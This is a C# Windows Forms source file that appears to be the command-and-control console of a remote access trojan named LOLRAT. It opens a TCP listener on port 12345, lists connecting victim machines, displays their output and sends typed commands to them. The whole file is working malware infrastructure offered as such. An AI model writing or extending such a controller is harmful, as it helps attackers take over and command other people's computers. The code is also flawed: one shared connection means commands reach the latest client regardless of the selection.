using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.Text;
using System.IO;

namespace LOLRAT_C2
{
    public partial class Form1 : Form
    {
        TcpListener server = null;
        Thread listenThread;
        TcpClient client;
        NetworkStream stream;

        public Form1()
        {
            InitializeComponent();
            listenThread = new Thread(new ThreadStart(ListenForClients));
            listenThread.Start();
        }

        private void ListenForClients()
        {
            try
            {
                server = new TcpListener(IPAddress.Any, 12345);
                server.Start();

                while (true)
                {
                    client = server.AcceptTcpClient();
                    Invoke(new Action(() => listBoxClients.Items.Add(client.Client.RemoteEndPoint.ToString())));

                    stream = client.GetStream();
                    Thread receiveThread = new Thread(new ThreadStart(ReceiveData));
                    receiveThread.Start();
                }
            }
            catch (SocketException e)
            {
                MessageBox.Show("SocketException: " + e);
                server.Stop();
            }
        }

        private void ReceiveData()
        {
            try
            {
                while (true)
                {
                    byte[] data = new byte[256];
                    int bytesRead = stream.Read(data, 0, data.Length);
                    if (bytesRead > 0)
                    {
                        string receivedText = Encoding.UTF8.GetString(data, 0, bytesRead);
                        Invoke(new Action(() => txtOutput.AppendText(receivedText + Environment.NewLine)));
                    }
                }
            }
            catch (IOException e)
            {
                MessageBox.Show("IOException: " + e);
                client.Close();
            }
        }

        private void btnSend_Click(object sender, EventArgs e)
        {
            if (listBoxClients.SelectedItem != null && txtCommand.Text != "")
            {
                try
                {
                    byte[] data = Encoding.ASCII.GetBytes(txtCommand.Text);
                    stream.Write(data, 0, data.Length);
                }
                catch (IOException ex)
                {
                    MessageBox.Show("IOException: " + ex);
                }
            }
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            base.OnFormClosing(e);
            if (server != null)
            {
                server.Stop();
            }
            Environment.Exit(0);
        }
    }
}
